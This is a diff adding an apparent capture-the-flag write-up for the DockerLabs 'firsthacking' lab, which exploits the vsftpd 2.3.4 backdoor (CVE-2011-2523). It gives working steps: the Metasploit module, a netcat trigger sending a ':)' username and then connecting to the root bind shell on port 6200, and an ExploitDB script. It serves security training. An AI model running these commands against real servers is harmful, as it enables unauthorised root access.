@@ -1,0 +1,229 @@
+---
+title: "firsthacking: vsftpd 2.3.4 Backdoor Exploitation"
+sidebarTitle: "firsthacking"
+description: "Writeup for the firsthacking DockerLabs machine (Very Easy): enumerate services with Nmap, exploit the vsftpd 2.3.4 backdoor via Metasploit and netcat to gain root."
+---
+
+firsthacking is a **Very Easy** DockerLabs machine built around one of the most famous backdoors in Linux history: **vsftpd 2.3.4**. A malicious version of the popular FTP daemon was briefly distributed in 2011 with a hidden backdoor that opens a root shell on port 6200 when a username ending in `:)` is submitted. This machine teaches you how to find and weaponise a known CVE using both Metasploit and a manual netcat approach — reinforcing the lesson that understanding the underlying mechanism is just as important as running the automated exploit.
+
+<Note>
+**Machine Info**
+
+| Field | Details |
+|---|---|
+| Difficulty | Very Easy (Muy Fácil / Súper Fácil) |
+| Category | Hacking Infraestructura |
+| OS | Linux |
+| Key Techniques | Service enumeration, vsftpd 2.3.4 backdoor (CVE-2011-2523), Metasploit, netcat, searchsploit |
+| Default Target IP | 172.17.0.2 |
+</Note>
+
+## Phase 0: Launch Kali Portable
+
+Open a second terminal and start your Kali Portable environment:
+
+```bash
+./run-kali.sh normal
+```
+
+All subsequent commands run **inside** this session.
+
+## Phase 1: Deploy the Machine
+
+Download `firsthacking.zip` from DockerLabs. In your first terminal:
+
+```bash
+unzip firsthacking.zip
+chmod +x auto_deploy.sh
+./auto_deploy.sh firsthacking.tar
+```
+
+You receive two files:
+- `auto_deploy.sh` — Deploys the vulnerable container
+- `firsthacking.tar` — The Docker image
+
+## Phase 2: Reconnaissance
+
+<Steps>
+  <Step title="Ping Check">
+    Verify the container is reachable:
+
+    ```bash
+    ping -c 3 172.17.0.2
+    ```
+  </Step>
+
+  <Step title="Nmap Service Scan">
+    Scan all ports at an aggressive rate to identify open services:
+
+    ```bash
+    nmap -sC -sV --min-rate 5000 172.17.0.2
+    ```
+
+    | Argument | Meaning |
+    |---|---|
+    | `-sC` | Default NSE scripts |
+    | `-sV` | Service and version detection |
+    | `--min-rate 5000` | Fast scan suitable for local lab environments |
+
+    **Findings:**
+
+    | Port | Service | Version |
+    |---|---|---|
+    | 21/tcp | FTP | **vsftpd 2.3.4** |
+
+    Only **port 21 (FTP)** is open, running **vsftpd 2.3.4** — exactly the backdoored version. This is the entire attack surface.
+
+    <Warning>
+    Use `--min-rate` only in controlled lab environments. In real engagements, aggressive scanning rates can saturate the network, trigger IDS alerts, and get your source IP blocked automatically.
+    </Warning>
+  </Step>
+</Steps>
+
+## Phase 3: Exploitation — Two Methods
+
+The vsftpd 2.3.4 backdoor (CVE-2011-2523) works by detecting a smiley face (`:)`) at the end of the username during FTP authentication. When it detects this string, the daemon opens a bind shell on **TCP port 6200** in the background. The attack can be carried out with Metasploit or entirely manually with netcat.
+
+### Method A: Metasploit (Automated)
+
+<Steps>
+  <Step title="Launch Metasploit and Find the Module">
+    Open Metasploit and search for the vsftpd exploit:
+
+    ```bash
+    msfconsole
+    ```
+
+    ```bash
+    search vsftpd 2.3.4
+    ```
+
+    The module `exploit/unix/ftp/vsftpd_234_backdoor` appears in the results.
+  </Step>
+
+  <Step title="Load and Configure the Module">
+    Select the exploit:
+
+    ```bash
+    use exploit/unix/ftp/vsftpd_234_backdoor
+    # Equivalent shorthand: use 0
+    ```
+
+    Review the options:
+
+    ```bash
+    show options
+    ```
+
+    Set the target and your local hosts:
+
+    ```bash
+    set RHOST 172.17.0.2
+    set LHOST 172.17.0.1
+    ```
+  </Step>
+
+  <Step title="Run the Exploit">
+    ```bash
+    exploit
+    ```
+
+    If Metasploit successfully triggers the backdoor, you will receive a command shell session. However, due to timing nuances with the backdoor's bind shell behaviour, Metasploit does not always open the session automatically — if it stalls, proceed to Method B below.
+  </Step>
+</Steps>
+
+### Method B: Manual Netcat Trigger (Recommended)
+
+When Metasploit fails to establish the session cleanly, the manual approach is more reliable. This method also gives you a much deeper understanding of how the backdoor actually works.
+
+<Steps>
+  <Step title="Trigger the Backdoor via FTP">
+    Send a specially crafted FTP authentication sequence using netcat. The `:)` at the end of the username is the trigger:
+
+    ```bash
+    (echo "USER root:)"; sleep 1; echo "PASS test") | nc 172.17.0.2 21
+    ```
+
+    | Part | Purpose |
+    |---|---|
+    | `echo "USER root:)"` | Sends a username ending with `:)` to trigger the backdoor |
+    | `sleep 1` | Pauses to let vsftpd process the smiley and open port 6200 |
+    | `echo "PASS test"` | Sends any password (the value does not matter) |
+    | `nc 172.17.0.2 21` | Connects to the FTP service on port 21 |
+
+    In the background, vsftpd opens a root bind shell on **port 6200**.
+  </Step>
+
+  <Step title="Connect to the Bind Shell">
+    In a new terminal window, connect to the now-open port 6200:
+
+    ```bash
+    nc -v 172.17.0.2 6200
+    ```
+
+    You land in an interactive shell session. Verify your identity:
+
+    ```bash
+    whoami
+    # root
+    ```
+  </Step>
+</Steps>
+
+### Method C: Python Exploit via Searchsploit
+
+A third option uses the public Python exploit from ExploitDB:
+
+```bash
+searchsploit vsftpd 2.3.4
+```
+
+Copy the Python exploit to your working directory:
+
+```bash
+cp /usr/share/exploitdb/exploits/unix/remote/49757.py .
+```
+
+Run it against the target:
+
+```bash
+python3 49757.py 172.17.0.2
+```
+
+The script handles the trigger and connection automatically, dropping you into a root shell.
+
+## Phase 4: Verification and Flag
+
+Regardless of which method you used, verify root access and capture the flag:
+
+```bash
+whoami
+# root
+
+id
+# uid=0(root) gid=0(root) groups=0(root)
+
+ls /root
+cat /root/flag.txt
+```
+
+## Post-Lab Cleanup
+
+Return to the deploy terminal and press `Ctrl+C` to stop the container. Type `exit` in your Kali Portable session.
+
+## Key Takeaways
+
+<CardGroup cols={2}>
+  <Card title="CVE-2011-2523: A Real Backdoor" icon="bug">
+    The vsftpd 2.3.4 backdoor is not a hypothetical scenario — it was a real supply-chain attack where a malicious version of the software was briefly served from the official download mirror. Always verify checksums of downloaded software.
+  </Card>
+  <Card title="Three Paths to the Same Root" icon="code-branch">
+    This machine is an excellent exercise in tool flexibility. Metasploit automates the attack, manual netcat teaches the underlying mechanism, and the Python script shows how standalone PoC exploits work. Learn all three approaches.
+  </Card>
+  <Card title="Bind Shells vs Reverse Shells" icon="terminal">
+    The vsftpd backdoor opens a **bind shell** — it listens on the target for your incoming connection. A reverse shell is the opposite: the target connects back to you. Bind shells are blocked more often by firewalls; reverse shells are preferred in real engagements.
+  </Card>
+  <Card title="Keep Software Updated" icon="arrows-rotate">
+    The fix for CVE-2011-2523 was removing the backdoor in vsftpd 2.3.5. Outdated or unmaintained services in production environments are a leading cause of successful breaches. Always patch and verify software integrity.
+  </Card>
+</CardGroup>
